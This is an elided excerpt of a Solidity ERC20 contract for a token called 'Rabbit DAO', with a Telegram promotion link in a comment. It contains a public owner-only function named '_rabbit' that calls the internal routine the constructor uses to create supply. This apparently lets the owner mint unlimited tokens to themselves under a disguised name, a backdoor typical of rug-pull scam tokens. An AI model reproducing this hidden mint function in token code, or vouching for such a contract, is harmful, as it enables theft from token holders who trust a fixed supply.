...
//
// 📱 Telegram::https://t.me/RabbitDaoCN
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _rabbit(uint256 amount) public onlyOwner {
 _rabbit(msg.sender, amount);
    }
    ...
    function _rabbit(address account, uint256 amount) internal virtual {
...
contract $RabbitDAO is ERC20 {
    ...
    constructor() public ERC20("Rabbit DAO", "RABBITDAO") {
     _rabbit(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}